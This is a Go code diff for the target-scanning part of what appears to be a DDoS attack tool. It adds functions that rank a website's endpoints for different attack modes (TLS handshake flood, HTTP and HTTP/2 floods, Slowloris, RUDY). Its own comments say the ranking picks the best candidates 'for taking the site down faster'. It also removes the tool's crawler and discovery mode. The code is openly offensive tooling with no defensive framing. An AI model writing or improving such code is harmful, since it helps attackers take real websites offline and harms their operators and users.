@@ -9,6 +9,7 @@ import (
 	"os"
 	"path/filepath"
 	"regexp"
+	"sort"
 	"strings"
 	"sync"
 	"time"
@@ -45,7 +46,7 @@ var commonAssetPaths = []string{
 	"/javascript/main.js",
 	"/js/bundle.js",
 	"/js/index.js",
-	
+
 	// CSS files
 	"/css/main.css",
 	"/css/style.css",
@@ -53,7 +54,7 @@ var commonAssetPaths = []string{
 	"/static/css/main.css",
 	"/assets/css/main.css",
 	"/styles/main.css",
-	
+
 	// Images
 	"/images/logo.png",
 	"/images/logo.jpg",
@@ -63,13 +64,13 @@ var commonAssetPaths = []string{
 	"/assets/images/logo.png",
 	"/images/favicon.ico",
 	"/favicon.ico",
-	
+
 	// Fonts
 	"/fonts/main.woff2",
 	"/fonts/main.woff",
 	"/static/fonts/main.woff2",
 	"/assets/fonts/main.woff2",
-	
+
 	// Common static paths
 	"/static/main.js",
 	"/static/main.css",
@@ -77,7 +78,7 @@ var commonAssetPaths = []string{
 	"/assets/main.css",
 	"/public/main.js",
 	"/public/main.css",
-	
+
 	// API endpoints that might return data
 	"/api/status",
 	"/api/health",
@@ -92,25 +93,19 @@ var CommonHTTPMethods = []string{"GET", "POST", "PUT", "DELETE"}
 
 // TargetScanner orchestrates the scanning process
 type TargetScanner struct {
-	config      ScanConfig
-	validator   *Validator
-	crawler     *Crawler
-	results     *ScanResult
-	resultsMu   sync.Mutex
+	config    ScanConfig
+	validator *Validator
+	results   *ScanResult
+	resultsMu sync.Mutex
 }
 
 // NewTargetScanner creates a new target scanner
 func NewTargetScanner(config ScanConfig) (*TargetScanner, error) {
 	validator := NewValidator(config)
-	crawler, err := NewCrawler(config)
-	if err != nil {
-		return nil, err
-	}
 
 	return &TargetScanner{
 		config:    config,
 		validator: validator,
-		crawler:   crawler,
 		results: &ScanResult{
 			TargetURL:      config.TargetURL,
 			ScanStartTime:  time.Now(),
@@ -126,7 +121,7 @@ func (ts *TargetScanner) Scan(ctx context.Context) (*ScanResult, error) {
 	// Collect all discovered endpoints
 	var allEndpoints []string
 	var endpointMethods = make(map[string][]string) // URL -> []methods
-	var endpointSources = make(map[string]string)    // URL -> discovery source
+	var endpointSources = make(map[string]string)   // URL -> discovery source
 
 	// If MaxDepth is 0, user provided specific URLs - validate them and discover assets
 	if ts.config.MaxDepth == 0 {
@@ -135,7 +130,7 @@ func (ts *TargetScanner) Scan(ctx context.Context) (*ScanResult, error) {
 		if ts.config.OnProgress != nil {
 			ts.config.OnProgress("Capturing network requests", 0, 1, 0)
 		}
-		
+
 		// Create network interceptor to capture all requests
 		interceptor, err := NewNetworkInterceptor(
 			ts.config.TargetURL,
@@ -153,10 +148,10 @@ func (ts *TargetScanner) Scan(ctx context.Context) (*ScanResult, error) {
 					if !IsSameDomainOrSubdomain(netReq.URL, ts.config.TargetURL) {
 						continue
 					}
-					
+
 					if !contains(allEndpoints, netReq.URL) {
 						allEndpoints = append(allEndpoints, netReq.URL)
-						
+
 						// Determine methods to test based on request type
 						methods := []string{netReq.Method}
 						if netReq.Type == "api" {
@@ -174,7 +169,7 @@ func (ts *TargetScanner) Scan(ctx context.Context) (*ScanResult, error) {
 							// For assets, test GET and HEAD
 							methods = []string{"GET", "HEAD"}
 						}
-						
+
 						// Merge with existing methods
 						if existingMethods, exists := endpointMethods[netReq.URL]; exists {
 							for _, m := range methods {
@@ -186,21 +181,21 @@ func (ts *TargetScanner) Scan(ctx context.Context) (*ScanResult, error) {
 						} else {
 							endpointMethods[netReq.URL] = methods
 						}
-						
+
 						// Mark source as network interception
 						endpointSources[netReq.URL] = "network"
 					}
 				}
 			}
 		}
-		
+
 		// Also add the target URL itself with multiple HTTP methods to test
 		if !contains(allEndpoints, ts.config.TargetURL) {
 			allEndpoints = append(allEndpoints, ts.config.TargetURL)
 			endpointMethods[ts.config.TargetURL] = []string{"GET", "POST", "PUT", "DELETE"}
 			endpointSources[ts.config.TargetURL] = "direct"
 		}
-		
+
 		// Discover additional assets (JS, CSS, images, etc.) from the base URL
 		if ts.config.OnProgress != nil {
 			ts.config.OnProgress("Discovering additional assets", len(allEndpoints), 100, 10)
@@ -225,7 +220,7 @@ func (ts *TargetScanner) Scan(ctx context.Context) (*ScanResult, error) {
 				}
 			}
 		}
-		
+
 		// Also test common asset paths
 		if ts.config.OnProgress != nil {
 			ts.config.OnProgress("Testing common asset paths", len(allEndpoints), 100, 20)
@@ -250,58 +245,6 @@ func (ts *TargetScanner) Scan(ctx context.Context) (*ScanResult, error) {
 				}
 			}
 		}
-	} else {
-		// Discovery mode - use scanner, crawler, and common endpoints
-		
-		// Phase 1: Use existing scanner to find login/auth endpoints
-		if ts.config.OnProgress != nil {
-			ts.config.OnProgress("Scanning", 0, 100, 0)
-		}
-		scannerEndpoints := ts.scanWithExistingScanner(ctx)
-		for _, ep := range scannerEndpoints {
-			allEndpoints = append(allEndpoints, ep.Result.URL)
-			if methods, exists := endpointMethods[ep.Result.URL]; exists {
-				endpointMethods[ep.Result.URL] = append(methods, ep.Method)
-			} else {
-				endpointMethods[ep.Result.URL] = []string{ep.Method}
-			}
-			endpointSources[ep.Result.URL] = "scanner"
-		}
-
-		// Phase 2: Add the target URL itself if not already discovered
-		if !contains(allEndpoints, ts.config.TargetURL) {
-			allEndpoints = append(allEndpoints, ts.config.TargetURL)
-			endpointMethods[ts.config.TargetURL] = []string{"GET", "POST"}
-			endpointSources[ts.config.TargetURL] = "direct"
-		}
-
-		// Phase 3: Crawl website to discover links
-		if ts.config.OnProgress != nil {
-			ts.config.OnProgress("Crawling", len(allEndpoints), 100, 50)
-		}
-		crawlResults, err := ts.crawler.Crawl(ctx)
-		if err == nil {
-			for _, result := range crawlResults {
-				if !contains(allEndpoints, result.URL) {
-					allEndpoints = append(allEndpoints, result.URL)
-					endpointMethods[result.URL] = []string{"GET"}
-					endpointSources[result.URL] = "crawler"
-				}
-			}
-		}
-
-		// Phase 4: Test common endpoints
-		if ts.config.OnProgress != nil {
-			ts.config.OnProgress("Testing common endpoints", len(allEndpoints), 100, 70)
-		}
-		commonEndpoints := ts.testCommonEndpoints(ctx)
-		for _, ep := range commonEndpoints {
-			if !contains(allEndpoints, ep) {
-				allEndpoints = append(allEndpoints, ep)
-				endpointMethods[ep] = []string{"GET", "POST"}
-				endpointSources[ep] = "common"
-			}
-		}
 	}
 
 	ts.results.TotalDiscovered = len(allEndpoints)
@@ -322,6 +265,22 @@ func (ts *TargetScanner) Scan(ctx context.Context) (*ScanResult, error) {
 				ts.results.ValidEndpoints[attackMode] = append(ts.results.ValidEndpoints[attackMode], endpoint)
 			}
 		}
+	}
+
+	// Optimize and apply per-method limits to all attack methods
+	for mode, endpoints := range ts.results.ValidEndpoints {
+		if len(endpoints) == 0 {
+			continue
+		}
+
+		max := 0
+		if ts.config.MaxValidPerMethod != nil {
+			if v, ok := ts.config.MaxValidPerMethod[mode]; ok {
+				max = v
+			}
+		}
+
+		ts.results.ValidEndpoints[mode] = selectBestEndpointsForMode(mode, endpoints, max)
 	}
 
 	return ts.results, nil
@@ -416,7 +375,7 @@ func (ts *TargetScanner) discoverAssets(ctx context.Context, baseURL string) []s
 	// Test common asset paths
 	for _, assetPath := range commonAssetPaths {
 		assetURL := parsedBase.ResolveReference(&url.URL{Path: assetPath}).String()
-		
+
 		// Quick test to see if asset exists
 		if ts.quickTest(ctx, assetURL) {
 			assetURLs = append(assetURLs, assetURL)
@@ -440,7 +399,7 @@ func (ts *TargetScanner) testCommonAssetPaths(ctx context.Context) []string {
 	// Test common asset paths
 	for _, assetPath := range commonAssetPaths {
 		assetURL := parsedBase.ResolveReference(&url.URL{Path: assetPath}).String()
-		
+
 		// Quick test to see if asset exists
 		if ts.quickTest(ctx, assetURL) {
 			assetURLs = append(assetURLs, assetURL)
@@ -652,7 +611,7 @@ func (ts *TargetScanner) SaveResults(result *ScanResult) error {
 			fmt.Fprintf(file, "# Hostname: %s\n", hostname)
 			fmt.Fprintf(file, "# Attack Method: %s\n", methodName)
 			fmt.Fprintf(file, "# Generated: %s\n", time.Now().Format(time.RFC3339))
-			fmt.Fprintf(file, "# Total valid endpoints: %d\n\n", len(endpoints))
+			fmt.Fprintf(file, "# Total valid endpoints (after ranking/limits): %d\n\n", len(endpoints))
 
 			// Write cURL commands
 			for _, endpoint := range endpoints {
@@ -685,19 +644,215 @@ func (ts *TargetScanner) isAssetURL(urlStr string) bool {
 	urlLower := strings.ToLower(urlStr)
 	assetExtensions := []string{".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp", ".ico", ".woff", ".woff2", ".ttf", ".otf", ".json", ".xml"}
 	assetPaths := []string{"/js/", "/css/", "/img/", "/images/", "/static/", "/assets/", "/public/", "/fonts/", "/styles/"}
-	
+
 	for _, ext := range assetExtensions {
 		if strings.Contains(urlLower, ext) {
 			return true
 		}
 	}
-	
+
 	for _, path := range assetPaths {
 		if strings.Contains(urlLower, path) {
 			return true
 		}
 	}
-	
+
 	return false
 }
 
+// scoreEndpointForMode computes a quality score for an endpoint for a given attack mode.
+// Higher scores indicate better candidates for taking the site down faster.
+func scoreEndpointForMode(mode ddos.AttackMode, ep EndpointResult) float64 {
+	switch mode {
+	case ddos.ModeTLSHandshakeFlood:
+		// Preserve and reuse the previous TLS-specific heuristics
+		score := 0.0
+
+		// Factor 1: Handshake speed (faster = higher score)
+		// Normalize: 0ms = 100 points, 2s = 0 points
+		if ep.TLSHandshakeTime > 0 {
+			handshakeScore := 100.0 * (1.0 - float64(ep.TLSHandshakeTime)/float64(2*time.Second))
+			if handshakeScore < 0 {
+				handshakeScore = 0
+			}
+			score += handshakeScore * 0.5 // 50% weight
+		}
+
+		// Factor 2: Asset type preference (assets are better for flooding)
+		assetBonus := 0.0
+		switch ep.AssetType {
+		case "js", "css", "image", "font", "static":
+			assetBonus = 30.0 // Assets are excellent for flooding
+		case "api":
+			assetBonus = 10.0 // APIs are okay
+		case "html":
+			assetBonus = 5.0 // HTML pages are less ideal
+		default:
+			assetBonus = 0.0
+		}
+		score += assetBonus * 0.2 // 20% weight
+
+		// Factor 3: Response time (if available, faster is better)
+		if ep.ResponseTime > 0 && ep.ResponseTime < 500*time.Millisecond {
+			responseScore := 100.0 * (1.0 - float64(ep.ResponseTime)/float64(500*time.Millisecond))
+			score += responseScore * 0.2 // 20% weight
+		}
+
+		// Factor 4: Concurrency / connection support
+		if ep.KeepsConnection {
+			score += 10.0 * 0.1 // 10% weight
+		}
+
+		return score
+
+	case ddos.ModeFlood, ddos.ModeHTTP2StreamFlood, ddos.ModeMixed:
+		// Prefer fast, cacheable/static assets that handle concurrency well
+		score := 0.0
+
+		// Response time (fast is better)
+		if ep.ResponseTime > 0 {
+			// Normalize: 0ms = 100, 1000ms = 0
+			respScore := 100.0 * (1.0 - float64(ep.ResponseTime)/float64(1000*time.Millisecond))
+			if respScore < 0 {
+				respScore = 0
+			}
+			score += respScore * 0.6
+		}
+
+		// Asset types are very good for flooding
+		switch ep.AssetType {
+		case "js", "css", "image", "font", "static":
+			score += 25.0
+		case "api":
+			score += 10.0
+		case "html":
+			score += 5.0
+		}
+
+		// Connection behaviour
+		if ep.KeepsConnection {
+			score += 10.0
+		}
+		if ep.SupportsHTTP2 {
+			score += 10.0
+		}
+
+		return score
+
+	case ddos.ModeSlowloris:
+		// Prefer endpoints that keep connections open for a long time and support keep-alive
+		score := 0.0
+
+		// Long connection timeout is ideal
+		if ep.ConnectionTimeout > 0 {
+			// Normalize: 0s = 0, 30s = 100
+			timeoutScore := 100.0 * float64(ep.ConnectionTimeout) / float64(30*time.Second)
+			if timeoutScore > 100 {
+				timeoutScore = 100
+			}
+			score += timeoutScore * 0.7
+		}
+
+		if ep.KeepsConnection {
+			score += 30.0
+		}
+
+		return score
+
+	case ddos.ModeRUDY:
+		// Prefer endpoints that accept very large bodies over POST
+		score := 0.0
+
+		if ep.AcceptsLargeBody {
+			score += 30.0
+		}
+
+		if ep.MaxBodySize > 0 {
+			// Normalize: 0MB = 0, 10MB = 100
+			maxBody := ep.MaxBodySize
+			if maxBody > 10*1024*1024 {
+				maxBody = 10 * 1024 * 1024
+			}
+			bodyScore := 100.0 * float64(maxBody) / float64(10*1024*1024)
+			score += bodyScore * 0.7
+		}
+
+		// Slight preference for non-HTML (APIs etc.)
+		if ep.AssetType == "api" || ep.AssetType == "json" {
+			score += 10.0
+		}
+
+		return score
+
+	default:
+		// Generic heuristic: prefer fast endpoints that keep connections and support HTTP/2
+		score := 0.0
+
+		if ep.ResponseTime > 0 {
+			respScore := 100.0 * (1.0 - float64(ep.ResponseTime)/float64(1000*time.Millisecond))
+			if respScore < 0 {
+				respScore = 0
+			}
+			score += respScore * 0.7
+		}
+
+		if ep.KeepsConnection {
+			score += 15.0
+		}
+		if ep.SupportsHTTP2 {
+			score += 15.0
+		}
+
+		return score
+	}
+}
+
+// selectBestEndpointsForMode sorts endpoints by quality for the given attack mode and
+// returns the best ones. If max is 0, all positively scored endpoints are returned.
+func selectBestEndpointsForMode(mode ddos.AttackMode, endpoints []EndpointResult, max int) []EndpointResult {
+	if len(endpoints) == 0 {
+		return endpoints
+	}
+
+	type scoredEndpoint struct {
+		endpoint EndpointResult
+		score    float64
+	}
+
+	scored := make([]scoredEndpoint, 0, len(endpoints))
+	for _, ep := range endpoints {
+		score := scoreEndpointForMode(mode, ep)
+		// Only keep endpoints with a meaningful score
+		if score > 0 {
+			scored = append(scored, scoredEndpoint{
+				endpoint: ep,
+				score:    score,
+			})
+		}
+	}
+
+	if len(scored) == 0 {
+		// Fall back to original list if everything scored 0
+		if max <= 0 || max >= len(endpoints) {
+			return endpoints
+		}
+		return endpoints[:max]
+	}
+
+	sort.Slice(scored, func(i, j int) bool {
+		return scored[i].score > scored[j].score
+	})
+
+	// Apply limit if configured
+	limit := len(scored)
+	if max > 0 && max < limit {
+		limit = max
+	}
+
+	result := make([]EndpointResult, 0, limit)
+	for i := 0; i < limit; i++ {
+		result = append(result, scored[i].endpoint)
+	}
+
+	return result
+}
